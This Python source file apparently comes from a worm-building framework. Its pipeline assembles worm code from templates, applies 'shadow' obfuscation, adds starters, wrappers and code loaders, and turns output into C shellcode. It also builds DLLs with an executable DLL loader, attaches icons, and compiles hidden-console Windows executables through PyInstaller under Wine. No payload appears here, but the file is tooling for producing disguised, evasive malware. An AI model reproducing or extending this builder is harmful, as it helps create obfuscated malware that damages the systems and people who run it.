import os
import shutil
from typing import Union, Callable
from jinja2 import Template

from .tools.external_script import ExternalModules
from .tools.master_wrapper import MasterWrapper
from .lib.comp_library import CompLibrary
from .mr_comp import MrComp

class WormPipeObject:
    def __init__(self, worm_pipeline: object, var: dict, options: dict = None):
        self.worm_pipeline = worm_pipeline
        self.worm = self.worm_pipeline.worm
        self.var = var
        self.gvar = options
        self.code_file_path = None
        self.exe_file_path = None
        self.exe_file_name = None
        self.file_name = None
        self.worm_name = self.worm.name
        self.work_dir = None
        self.shellcode = None
        self.icon_name = None
        ### DLL
        self.dll_name = None
        self.dll_export = None
        self.dll_func = []
        ### List of files for the finished application
        self._to_dev = []

        self.icon_path = self.gvar.get("ICON")
        self.pre_compile = True
        self.comp_script_name = None
        self.code = ""
        self.last_error = 0


class WormPipeLine:
    def __init__(self, coder: object, worm: object, worm_constructor: object):
        self.coder = coder
        self.worm = worm
        self.get_item = self.worm.get_item
        self.constructor = worm_constructor
        self.dir_hive = self.constructor.dir_hive
        self.name = self.constructor.name
        self.msg = self.coder.msg
        self.pipeline = []
    
    def pipe_code_base(self, worm_pipe: object) -> object:
        if not worm_pipe.gvar:
            worm_pipe.gvar = self.constructor.globalVar.copy()
        code = self.coder.code_worm_base(worm_pipe.var, worm_pipe.gvar)
        worm_pipe.code = code
        return worm_pipe
    
    def pipe_code_external(self, worm_pipe: object) -> object:
        worm_pipe.code = self.coder.raw_code(worm_pipe.var)
        self.constructor.ExtMods.use(worm_pipe)
        return worm_pipe
    
    def pipe_add_imports(self, worm_pipe: object) -> object:
        imp = "\n".join(self.coder.imports)
        worm_pipe.code = imp + "\n" + worm_pipe.code
        return worm_pipe

    def pipe_save_raw_worm(self, worm_pipe: object) -> object:
        fext = worm_pipe.gvar.get("FEXT")
        if not fext:
            fext = ".py"
        name = worm_pipe.gvar.get("RAW_WORM_NAME")
        if not name:
            name = self.worm.name
        work_dir = os.path.join(self.dir_hive, name)
        if not os.path.exists(work_dir):
            os.mkdir(work_dir)
        fpath = os.path.join(work_dir, f"{name}{fext}")
        try:
            with open(fpath, "w") as file:
                file.write(worm_pipe.code)
            worm_pipe.last_error = 0
        except Exception as e:
            self.msg("error", f"[!!] ERROR: Save raw worm: {e} [!!]")
            worm_pipe.last_error = 1
            return worm_pipe
        worm_pipe.file_name = f"{name}{fext}"
        worm_pipe.work_dir = work_dir
        worm_pipe.worm_name = name
        worm_pipe.code_file_path = fpath
        return worm_pipe

    
    def pipe_compile_worm(self, worm_pipe: object) -> object:
        if worm_pipe.gvar.get("NO_COMPILE"):
            self.msg("msg", "NO_COMPILE FLAG. Skip compilation.", sender=self.name)
            return worm_pipe
        worm_pipe = self.constructor.master.compile(worm_pipe)
        return worm_pipe
    
    def pipe_use_starter(self, worm_pipe: object) -> object:
        if not self.worm.raw_worm.starter:
            self.msg("msg", "No Starter. Skipping step.", sender=self.name)
            return worm_pipe
        worm_pipe = self.coder.starter.use(worm_pipe, self.worm.raw_worm.starter)
        
        return worm_pipe
    
    def pipe_use_shadow(self, worm_pipe: object) -> object:
        if len(self.worm.raw_worm.shadow) > 0:
            self.msg("msg", f"Number obfuscated methods: {len(self.worm.raw_worm.shadow)}", sender=self.name)
        for shadow in self.worm.raw_worm.shadow.values():
            worm_pipe = self.coder.shadow.use(worm_pipe, shadow)
        return worm_pipe
    
    def pipe_show_op_code(self, worm_pipe: object) -> object:
        try:
            worm_pipe.shellcode = self.constructor.ExtMods.show_opcode(worm_pipe.exe_file_path)
        except Exception as e:
            self.msg("error", f"ERROR: Show OP Code: {e}", sender=self.name)
        return worm_pipe
    
    def pipe_build_C_shellcode(self, worm_pipe: object) -> object:
        if not worm_pipe.shellcode:
            self.msg("error", "ERROR: No Shellcode. Skipping step.", sender=self.name)
            return worm_pipe
        data = {"SHELL_CODE" : worm_pipe.shellcode}
        self.constructor.ExtMods.pattern.render(worm_pipe.worm_name, data, "shellcode_C")
        return worm_pipe
        
    def pipe_add_wrapper(self, worm_pipe: object) -> object:
        wrapper = self.worm.raw_worm.wrapper
        if not wrapper:
            self.msg("msg", "No Wrapper. Skipping step.", sender=self.name)
            return worm_pipe
        self.msg("msg", f"Use wrapper: '{wrapper.name}'", sender=self.name)
        worm_pipe = self.constructor.Wrapper.wrap_worm(worm_pipe, wrapper)
        return worm_pipe
    
    def pipe_add_code_loader(self, worm_pipe: object) -> object:
        loader = ""
        for load in worm_pipe.worm.code_loaders:
            code = self.coder.render_single(load, worm_pipe.var)
            loader += code + "\n"
        worm_pipe.code = loader + worm_pipe.code
        worm_pipe = self.pipe_correct_code(worm_pipe)
        return worm_pipe

    def pipe_correct_code(self, worm_pipe: object) -> object:
        codes = worm_pipe.code.split("\n")
        code = ""
        for line in codes:
            if line.strip() == "\n" or line.strip() == "":
                continue
            code += line + "\n"
        worm_pipe.code = code
        return worm_pipe
    
    def pipe_copy_icon(self, worm_pipe: object) -> object:
        if not worm_pipe.icon_path:
            return worm_pipe
        worm_pipe.icon_name = os.path.basename(worm_pipe.icon_path)
        tpath = os.path.join(self.dir_hive, worm_pipe.worm_name, worm_pipe.icon_name)
        try:
            shutil.copy2(worm_pipe.icon_path, tpath)
        except Exception as e:
            self.msg("error", f"ERROR: Copying icon: '{e}'")
            return worm_pipe
        worm_pipe.icon_path = tpath
        return worm_pipe
    
    def pipe_prepare_out_dir(self, worm_pipe: object) -> object:
        if not os.path.exists(os.path.join(self.dir_hive, worm_pipe.worm_name)):
            os.mkdir(os.path.join(self.dir_hive, worm_pipe.worm_name))
        worm_pipe.work_dir = os.path.join(self.dir_hive, worm_pipe.worm_name)
        return worm_pipe
    
    def pipe_prepare_compiler(self, worm_pipe: object) -> object:
        self.msg("msg", "Prepare compilation script", sender=self.name)
        if not worm_pipe.gvar.get("PRE_COMPILE"):
            self.msg("msg", "No compilation script. Standard used.")
            worm_pipe.pre_compile = False
            return worm_pipe
        mr_comp = MrComp(self.constructor.CompLib, self.constructor.master, worm_pipe.var, worm_pipe.gvar)
        worm_pipe = mr_comp.make_script(worm_pipe)
        return worm_pipe
    
    def pipe_prepare_def_file(self, worm_pipe: object) -> object:
        worm_pipe.dll_name = worm_pipe.var.get("_DLL_NAME")
        lib_name = worm_pipe.dll_name.split(".")[0] if "." in worm_pipe.dll_name else worm_pipe.dll_name
        
        def_path = os.path.join(worm_pipe.work_dir, f"{lib_name}.def")
        export_fun = []
        for k,i in worm_pipe.var.items():
            if k.startswith("_DLL_FUNC_"):
                export_fun.append(i)
        exp_fun = "\n\t".join(export_fun)
        worm_pipe.dll_export = exp_fun
        worm_pipe.dll_func = export_fun
        template = f"LIBRARY {lib_name}\nEXPORTS\n\t{exp_fun}"
        with open(def_path, "w") as file:
            file.write(template)
        self.msg("msg", f"Create 'def' file successfull", sender=self.name)
        return worm_pipe
    
    def pipe_make_dll_file(self, worm_pipe: object) -> object:
        if worm_pipe.gvar.get("NO_COMPILE"):
            self.msg("msg", "NO_COMPILE FLAG. Skip making DLL file.", sender=self.name)
            return worm_pipe
        self.msg("msg", "Prepare DLL file", sender=self.name)
        worm_pipe = self.pipe_prepare_def_file(worm_pipe)
        self.msg("msg", "Making DLL file", sender=self.name)
        worm_pipe = self.constructor.master.multi.compile_dll(worm_pipe)
        worm_pipe._to_dev.append(os.path.join(worm_pipe.work_dir, worm_pipe.dll_name))
        return worm_pipe
    
    def pipe_make_dll_loader(self, worm_pipe: object) -> object:
        # worm_pipe.var["_DLL_EXPORT"] = worm_pipe.dll_export
        if worm_pipe.gvar.get("NO_COMPILE"):
            self.msg("msg", "NO_COMPILE FLAG. Skip builiding DLL Loader.", sender=self.name)
            return worm_pipe
        executor = worm_pipe.var.get("_DLL_EXEC", "SDLL_Loader")
        executor = self.get_item("support", executor)
        if not executor:
            self.msg("error", f"[!!] ERROR: Can't find module: '{executor}' [!!]", sender=self.name)
            return worm_pipe
        loader = Template(executor.raw_code)
        loader = loader.render(worm_pipe.var, DLL_EXPORT=worm_pipe.dll_func)
        self.msg("msg", f"Making executable DLL loader '{executor.name}'", sender=self.name)
        worm_pipe.code = loader
        worm_pipe = self.pipe_save_raw_worm(worm_pipe)
        worm_pipe = self.constructor.master.multi.compile_win32_extra(worm_pipe)
        if not worm_pipe.exe_file_path in worm_pipe._to_dev:
            worm_pipe._to_dev.append(worm_pipe.exe_file_path)
        return worm_pipe
    
    def pipe_sort_app(self, worm_pipe: object) -> object:
        if len(worm_pipe._to_dev) > 1:
            self.msg("msg", "Prepare a directory with all the necessary files.", sender=self.name)
            app_dir = os.path.join(worm_pipe.work_dir, worm_pipe.worm_name)
            if not os.path.exists(app_dir):
                os.mkdir(app_dir)
            for file in worm_pipe._to_dev:
                shutil.copy2(file, os.path.join(app_dir, os.path.basename(file)))
                self.msg("no_imp", f"Copying file '{os.path.basename(file)}'", sender=self.name)
        return worm_pipe
        
    
    def add_step(self, name: str) -> None:
        match name:
            case "BASE":
                self.pipeline.append(self.pipe_code_base)
            case "SAVE_RAW":
                self.pipeline.append(self.pipe_save_raw_worm)
            case "COMPILER":
                self.pipeline.append(self.pipe_compile_worm)
            case "STARTER":
                self.pipeline.append(self.pipe_use_starter)
            case "SHADOW":
                self.pipeline.append(self.pipe_use_shadow)
            case "BASE_SHELL":
                self.pipeline.append(self.pipe_code_external)
            case "SHOW_OP_CODE":
                self.pipeline.append(self.pipe_show_op_code)
            case "BUILD_C_SCODE":
                self.pipeline.append(self.pipe_build_C_shellcode)
            case "ADD_IMPORTS":
                self.pipeline.append(self.pipe_add_imports)
            case "WRAPPER":
                self.pipeline.append(self.pipe_add_wrapper)
            case "CODE_LOADER":
                self.pipeline.append(self.pipe_add_code_loader)
            case "PRE_COMPILER":
                self.pipeline.append(self.pipe_prepare_compiler)
            case "MAKE_DEF_FILE":
                self.pipeline.append(self.pipe_prepare_def_file)
            case "MAKE_DLL_FILE":
                self.pipeline.append(self.pipe_make_dll_file)
            case "DLL_LOADER":
                self.pipeline.append(self.pipe_make_dll_loader)
            case _:
                self.msg("error", f"ERROR: Unknown Pipe Process: '{name}'", sender=self.name)
    
    def prepare_pipe(self) -> None:
        self.pipeline = []
        self.pipeline.append(self.pipe_prepare_out_dir)
        self.pipeline.append(self.pipe_copy_icon)
        for proc in self.worm.pipe_process:
            if proc == "COMPILER":
                self.add_step("PRE_COMPILER")
            self.add_step(proc)
        self.pipeline.append(self.pipe_sort_app)
    
    def update_global_var(self, var: dict, gvar: dict) -> dict:
        for name, value in var.items():
            if name.startswith("GLOBAL_"):
                if value == "False" or value == "None":
                    value = None
                gvar[name[7:]] = value
        return gvar

    
    def process_worm(self, var: dict, gvar: dict) -> None:
        gvar = self.update_global_var(var, gvar)
        self.msg("msg", "Prepare variables and process pipes", sender=self.name)
        self.prepare_pipe()
        worm_pipe = WormPipeObject(self, var, gvar)
        self.msg("msg", "Start build worm....", sender=self.name)
        out = ""
        for proc in self.pipeline:
            worm_pipe = proc(worm_pipe)
        self.msg("msg", "Process build worm successful.", sender=self.name)
    


    





class WormConstructor:
    def __init__(self, coder: object, master_compiler: object):
        self.coder = coder
        self.name = "WormConstructor"
        self.master = master_compiler
        self.msg = self.coder.msg
        self.dir_hive = self.coder.dir_out
        self.dir_hive_worm = None
        self.raw_worm_file_path = None
        self.Pipeline = WormPipeLine(self.coder, self.coder.WB, self)
        self.ExtMods = ExternalModules(self.coder, self.master, self)
        self.Wrapper = MasterWrapper(self.coder)
        self.CompLib = CompLibrary(self)


    def save_raw_worm(self, code: str, name: str = None, file_ext: str = ".py") -> Union[str, None]:
        if not name:
            name = self.coder.WB.name
        self.dir_hive_worm = os.path.join(self.dir_hive, name)
        if not os.path.exists(self.dir_hive_worm):
            os.mkdir(self.dir_hive_worm)
        self.raw_worm_file_path = os.path.join(self.dir_hive_worm, f"{name}{file_ext}")
        try:
            with open(self.raw_worm_file_path, "w") as file:
                file.write(code)
            self.msg("msg", f"Save raw worm: '{name}{file_ext}' successful.", sender=self.name)
            return f"{name}{file_ext}"
        except Exception as e:
            self.msg("error", f"[!!] ERROR: Save raw worm: {e} [!!]", sender=self.name)
            return None
    
    def build_WORM(self, options: dict = {}) -> None:
        # options.update(self.globalVar)
        opt = self._globalVar()
        opt.update(options)
        var = self.coder.var.copy()
        self.Pipeline.process_worm(var, opt)


    def _globalVar(self) -> dict:
        conf = self._default_options()
        conf.update(self.coder.globalVar.copy())
        return conf
    
    def _default_options(self) -> dict:
        conf = {}
        conf["COMP_LANG"] = self.coder.WB.lang
        # default set to hide console and output
        conf["PROGRAM_TYPE"] = "window"
        conf["ICON"] = self.coder.icon
        # OS binary
        conf["OS_EXEC"] = "win"
        if conf["COMP_LANG"] == "asm":
            conf["FEXT"] = ".asm"
            conf["COMPILER_NAME"] = "MC_win32"
        else:
            conf["FEXT"] = ".py"
            conf["COMPILER_NAME"] = "WinePyInst"
        return conf
